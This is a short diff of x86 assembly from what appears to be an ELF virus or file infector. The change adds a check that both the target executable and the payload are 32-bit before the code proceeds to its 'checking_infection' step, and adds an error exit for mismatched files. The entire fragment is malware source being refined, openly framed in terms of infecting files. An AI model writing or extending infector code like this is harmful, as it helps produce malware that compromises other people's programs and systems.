@@ -185,11 +185,18 @@ mmap_err:
 	jmp unmap_elf	; pivot failed -> elf was mapped -> unmap elf, close files then exit
 
 after_mapping:
-	; next we have to check if the file we're infecting is 32 bit little endian, if not then we exit
+	; next we have to check if both the target file and the payload are 32 but, if not then we exit
 	push dword[pivot_data]
 	call is_target_elf	; returns -1 for false, 0 for true
+	test eax, eax		; is this a good file ?
+	jne arch_err
+
+	push dword[elf_data]
+	call is_target_elf
+	test eax, eax		; is this a good file ?
 	je checking_infection
 
+arch_err:
 	push ERR_NOT_TARGET
 	jmp clean
 
